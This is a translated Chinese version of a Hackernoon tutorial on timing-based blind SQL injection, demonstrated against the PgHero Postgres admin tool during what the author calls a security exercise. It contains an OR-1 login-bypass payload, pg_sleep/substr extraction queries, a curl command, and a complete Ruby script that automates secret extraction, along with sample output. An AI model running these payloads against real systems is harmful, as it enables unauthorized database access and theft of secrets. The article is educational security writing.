<html>
<head>
<title>Timing-based Blind SQL Attacks</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">基于时间的盲SQL攻击</h1>
<blockquote>原文：<a href="https://medium.com/hackernoon/timing-based-blind-sql-attacks-bd276dc618dd?source=collection_archive---------4-----------------------#2017-01-09">https://medium.com/hackernoon/timing-based-blind-sql-attacks-bd276dc618dd?source=collection_archive---------4-----------------------#2017-01-09</a></blockquote><div><div class="ef hi hj hk hl hm"/><div class="hn ho hp hq hr"><div class=""/><p id="4db0" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">在典型的SQL注入攻击中，攻击者会在原本安全的查询中插入额外的SQL。考虑这个用户登录查询:</p><pre class="jp jq jr js fq jt ju jv jw aw jx dt"><span id="cc4a" class="jy jz hu ju b fv ka kb l kc kd">SELECT 1 FROM users WHERE email = 'user@example.org' AND password = 'password';</span></pre><p id="d3ad" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">如果用户输入的密码没有被清除，攻击者可以手工创建一个可以改变查询的输入，例如<code class="eh ke kf kg ju b">' OR 1='</code>:</p><pre class="jp jq jr js fq jt ju jv jw aw jx dt"><span id="22db" class="jy jz hu ju b fv ka kb l kc kd">SELECT 1 FROM users WHERE email = 'user@example.org' AND password = 'password' OR 1='1';</span></pre><p id="ba37" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">注入的SQL关闭第一个谓词，并将其与另一个始终为真的谓词进行or运算；这意味着这个“密码”可以用于登录任何帐户。</p><p id="af43" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">值得注意的是，虽然这绕过了帐户安全，但它不会泄露任何敏感信息。也就是说，这是一次<em class="kh">盲目的</em> SQL注入攻击，因为我们看不到我们SQL注入的结果；对我们的登录操作的响应没有分享密码实际是什么。</p><h2 id="57cf" class="jy jz hu bd ki kj kk kl km kn ko kp kq jc kr ks kt jg ku kv kw jk kx ky kz la dt translated">作弄PgHero</h2><p id="a752" class="pw-post-body-paragraph ir is hu it b iu lb iw ix iy lc ja jb jc ld je jf jg le ji jj jk lf jm jn jo hn dt translated">作为最近一次安全训练的一部分，我的任务是扮演一个假冒的攻击者，他已经获得了我们的一个管理工具的访问权限。PgHero 是一个基于Ruby的工具，它为Postgres提供了一个管理接口，重点是性能调优。它非常有用。一个包含的特性是查询解释器和分析器:</p><figure class="jp jq jr js fq li fe ff paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="fe ff lh"><img src="../Images/c9aaa9406853813f3647496d62bfa7e4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0LP26FuipTdI_mTijrH3Rg.png"/></div></div></figure><p id="97d6" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">此工具提供解释或分析的结果，两者都不包括查询结果中的任何数据。通过将查询包装在事务中并回滚，该工具还可以防止数据的破坏或突变。乍一看，这似乎是一个无害的工具:不能改变任何东西，也不能恢复任何东西。</p><h2 id="60e8" class="jy jz hu bd ki kj kk kl km kn ko kp kq jc kr ks kt jg ku kv kw jk kx ky kz la dt translated">基于时间的攻击</h2><p id="b4cd" class="pw-post-body-paragraph ir is hu it b iu lb iw ix iy lc ja jb jc ld je jf jg le ji jj jk lf jm jn jo hn dt translated">虽然Explain/Analyze不返回查询的结果，但是它返回关于查询的元数据:<em class="kh">执行查询需要多长时间</em>。考虑以下查询:</p><pre class="jp jq jr js fq jt ju jv jw aw jx dt"><span id="d12b" class="jy jz hu ju b fv ka kb l kc kd">SELECT CASE WHEN secret = 'secret' THEN pg_sleep(5) ELSE NULL END FROM apps WHERE id = 1 ;</span></pre><p id="86b2" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">如果猜测错误，该查询将快速返回，如果猜测正确，将花费大约5s。使用这种查询风格和计时执行时间，我们现在可以从数据库中提取二进制(是/否)答案。使用<code class="eh ke kf kg ju b">substr</code>，可以枚举字符串中您试图发现的每个字符:</p><pre class="jp jq jr js fq jt ju jv jw aw jx dt"><span id="25da" class="jy jz hu ju b fv ka kb l kc kd">-- brute force 1st character<br/>SELECT CASE WHEN substr(secret, 1, 1) = 'a' THEN pg_sleep(5) ELSE NULL END FROM apps WHERE id = 1 ;<br/>SELECT CASE WHEN substr(secret, 1, 1) = 'b' THEN pg_sleep(5) ELSE NULL END FROM apps WHERE id = 1 ;<br/>SELECT CASE WHEN substr(secret, 1, 1) = 'c' THEN pg_sleep(5) ELSE NULL END FROM apps WHERE id = 1 ;<br/>...</span><span id="7354" class="jy jz hu ju b fv lp kb l kc kd">-- brute force 16th character<br/>SELECT CASE WHEN substr(secret, 16, 1) = 'a' THEN pg_sleep(5) ELSE NULL END FROM apps WHERE id = 1 ;<br/>SELECT CASE WHEN substr(secret, 16, 1) = 'b' THEN pg_sleep(5) ELSE NULL END FROM apps WHERE id = 1 ;<br/>SELECT CASE WHEN substr(secret, 16, 1) = 'c' THEN pg_sleep(5) ELSE NULL END FROM apps WHERE id = 1 ;<br/>...</span></pre><p id="2a78" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated"><em class="kh">注意:如果你需要做的不仅仅是概念验证，二进制搜索会比测试每种可能性快得多。</em></p><p id="d715" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">对于每个字符，用了大约5s运行的查询指示了正确的字符。如果由于某种原因<code class="eh ke kf kg ju b">pg_sleep()</code>不可用，任何足够慢/昂贵的查询都可以(例如，连接一个没有索引的字段)。</p><p id="e71f" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">要对PgHero运行这些查询，需要将SQL封装在适当的cURL命令中:</p><pre class="jp jq jr js fq jt ju jv jw aw jx dt"><span id="ee68" class="jy jz hu ju b fv ka kb l kc kd">curl --silent \<br/>  -d "query='SELECT CASE WHEN substr(secret,1,1) = 'a' THEN pg_sleep(5) ELSE NULL END FROM apps WHERE id=1;'" \<br/>  -d "commit=Analyze" \<br/>  --user admin:password \<br/>  <a class="ae lg" href="https://myhost.com/pghero/explain" rel="noopener ugc nofollow" target="_blank">https://myhost.com/pghero/explain</a></span></pre><p id="0287" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">有了<a class="ae lg" href="https://gist.github.com/derwiki/0b6ab5617171d4d6632e3bacd3356229" rel="noopener ugc nofollow" target="_blank">小样板</a>，我们可以自动化整个提取过程:</p><pre class="jp jq jr js fq jt ju jv jw aw jx dt"><span id="1b40" class="jy jz hu ju b fv ka kb l kc kd">POSITIVE_DELAY = 2<br/>CHARS = ('A'..'Z').to_a + ('a'..'z').to_a + ('0'..'9').to_a<br/><br/>def query(table, field, id, char, pos)<br/>  %Q[SELECT CASE WHEN substr(#{field}, #{pos}, 1) = \'#{char}\' THEN pg_sleep(#{POSITIVE_DELAY}) ELSE NULL END FROM #{table} WHERE id = #{id} ;]<br/>end<br/><br/>def timeit<br/>  t0 = Time.now<br/>  yield<br/>  Time.now - t0<br/>end<br/><br/>def curl_test(table, field, id, char, pos)<br/>  cmd = &lt;&lt;-CMD.squish<br/>    curl --silent -d "query=#{query(table, field, id, char, pos)}" -d "commit=Analyze"<br/>      --user admin:password<br/>      https://myhost.com/pghero/explain<br/>  CMD<br/>  timeit { `#{ cmd }` } &gt; POSITIVE_DELAY<br/>end<br/><br/>def retrieve_field(table, field, id)<br/>  buffer = ""<br/>  (1..255).each do |pos|<br/>    found = false<br/>    CHARS.each do |char|<br/>      if curl_test(table, field, id, char, pos)<br/>        puts "#{pos}: #{char}"<br/>        buffer &lt;&lt; char<br/>        found = true<br/>        break # once a match is found, move on<br/>      end<br/>    end<br/>    break unless found # if nothing matched, treat as end of string<br/>  end<br/>  buffer<br/>end<br/><br/>secret = retrieve_field('apps', 'secret', 1)<br/>puts "secret: #{secret}"</span></pre><p id="efff" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">这种攻击的一个例子是:</p><pre class="jp jq jr js fq jt ju jv jw aw jx dt"><span id="ae0d" class="jy jz hu ju b fv ka kb l kc kd">$ ruby blind-sql.rb<br/>1: 6<br/>2: 4<br/>3: 2<br/>4: 8<br/>5: 9<br/>6: a<br/>7: 1<br/>8: 0<br/>9: 9<br/>10: c<br/>11: d<br/>12: 6<br/>13: 3<br/>14: b<br/>15: d<br/>16: f<br/>17: 0<br/>18: 3<br/>19: a<br/>20: 8<br/>key: 64289a109cd63bdf03a8</span></pre><h2 id="7e2d" class="jy jz hu bd ki kj kk kl km kn ko kp kq jc kr ks kt jg ku kv kw jk kx ky kz la dt translated">摘要</h2><p id="804a" class="pw-post-body-paragraph ir is hu it b iu lb iw ix iy lc ja jb jc ld je jf jg le ji jj jk lf jm jn jo hn dt translated">任何SQL注入攻击媒介都是坏消息。通常它们是由编程错误引起的，但是管理工具也可能暴露SQL注入式的攻击。如果SQL注入向量没有暴露查询的结果，仍然可以使用基于时间的攻击系统地提取结果。</p><p id="ad87" class="pw-post-body-paragraph ir is hu it b iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo hn dt translated">延伸阅读:</p><ul class=""><li id="9b18" class="lq lr hu it b iu iv iy iz jc ls jg lt jk lu jo lv lw lx ly dt translated"><a class="ae lg" href="https://www.owasp.org/index.php/Blind_SQL_Injection" rel="noopener ugc nofollow" target="_blank">https://www.owasp.org/index.php/Blind_SQL_Injection</a></li><li id="459c" class="lq lr hu it b iu lz iy ma jc mb jg mc jk md jo lv lw lx ly dt translated">http://www.sqlinjection.net/time-based/<a class="ae lg" href="http://www.sqlinjection.net/time-based/" rel="noopener ugc nofollow" target="_blank"/></li><li id="56dc" class="lq lr hu it b iu lz iy ma jc mb jg mc jk md jo lv lw lx ly dt translated"><a class="ae lg" href="https://www.defcon.org/images/defcon-16/dc16-presentations/alonso-parada/defcon-16-alonso-parada-wp.pdf" rel="noopener ugc nofollow" target="_blank">https://www . defcon . org/images/defcon-16/dc16-presentations/alon so-parada/defcon-16-alon so-parada-WP . pdf</a></li></ul><div class="jp jq jr js fq ab cb"><figure class="me li mf mg mh mi mj paragraph-image"><a href="http://bit.ly/HackernoonFB"><img src="../Images/50ef4044ecd4e250b5d50f368b775d38.png" data-original-src="https://miro.medium.com/v2/resize:fit:668/format:webp/1*0hqOaABQ7XGPT-OYNgiUBg.png"/></a></figure><figure class="me li mf mg mh mi mj paragraph-image"><a href="https://goo.gl/k7XYbx"><img src="../Images/979d9a46439d5aebbdcdca574e21dc81.png" data-original-src="https://miro.medium.com/v2/resize:fit:668/format:webp/1*Vgw1jkA6hgnvwzTsfMlnpg.png"/></a></figure><figure class="me li mf mg mh mi mj paragraph-image"><a href="https://goo.gl/4ofytp"><img src="../Images/2930ba6bd2c12218fdbbf7e02c8746ff.png" data-original-src="https://miro.medium.com/v2/resize:fit:668/format:webp/1*gKBpq1ruUi0FVK2UM_I4tQ.png"/></a></figure></div><blockquote class="mk ml mm"><p id="f922" class="ir is kh it b iu iv iw ix iy iz ja jb mn jd je jf mo jh ji jj mp jl jm jn jo hn dt translated"><a class="ae lg" href="http://bit.ly/Hackernoon" rel="noopener ugc nofollow" target="_blank">黑客中午</a>是黑客如何开始他们的下午。我们是<a class="ae lg" href="http://bit.ly/atAMIatAMI" rel="noopener ugc nofollow" target="_blank"> @AMI </a>家庭的一员。我们现在<a class="ae lg" href="http://bit.ly/hackernoonsubmission" rel="noopener ugc nofollow" target="_blank">接受投稿</a>并乐意<a class="ae lg" href="mailto:partners@amipublications.com" rel="noopener ugc nofollow" target="_blank">讨论广告&amp;赞助</a>机会。</p><p id="708a" class="ir is kh it b iu iv iw ix iy iz ja jb mn jd je jf mo jh ji jj mp jl jm jn jo hn dt translated">如果你喜欢这个故事，我们推荐你阅读我们的<a class="ae lg" href="http://bit.ly/hackernoonlatestt" rel="noopener ugc nofollow" target="_blank">最新科技故事</a>和<a class="ae lg" href="https://hackernoon.com/trending" rel="noopener ugc nofollow" target="_blank">趋势科技故事</a>。直到下一次，不要把世界的现实想当然！</p></blockquote><figure class="jp jq jr js fq li fe ff paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="fe ff mq"><img src="../Images/be0ca55ba73a573dce11effb2ee80d56.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*35tCjoPcvq6LbB3I6Wegqw.jpeg"/></div></div></figure></div></div>    
</body>
</html>